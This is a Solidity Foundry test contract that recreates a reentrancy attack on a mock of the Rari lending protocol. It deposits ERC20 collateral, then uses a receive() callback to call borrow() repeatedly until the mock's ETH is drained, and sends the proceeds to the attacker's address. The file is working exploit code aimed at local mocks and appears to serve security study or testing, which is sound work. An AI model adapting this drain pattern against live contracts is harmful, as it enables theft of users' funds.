// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import { DAOWallet } from "../DAOWallet.sol";
import { MockERC20 } from "../../mocks/MockERC20.sol";
import { MockRari } from "../attacks/rari/MockRari.sol";

contract AttackToken is Test {
    address public owner;
    MockERC20 public token;
    MockRari public mockRari;

    constructor (
        address _token,
        address payable _mockRari
    ) payable {
        owner = msg.sender;
        token = MockERC20(_token);
        mockRari = MockRari(_mockRari);
    }

    /// @notice Reentrancy logic here
    /// @dev Doesn't need to payable because we are using ERC20, not ETH for collateral
    /// @param amount Amount of ERC20 tokens to deposit to trigger reentrancy
    function attackRari(uint amount) external {
        emit log_named_address("hacker address: ",  owner);
        /// allowances
        token.approve(address(mockRari), amount);

        /// deposit and withdraw must be in the same function
        mockRari.depositTokens(amount);

        /// perform reentrancy call depositing ERC20 and pulling out ETH
        mockRari.borrow();
    }

    receive() external payable {
        emit log_string("in receive");
        if (address(mockRari).balance > 0) {
            emit log_named_uint("attackToken contract balance", address(this).balance);
            mockRari.borrow();
        } else {
            console.log('victim account drained');
            payable(owner).transfer(address(this).balance);
        }
    }

    function getContractTokenBalance() public view returns (uint) {
        return token.balanceOf(address(this));
    }
}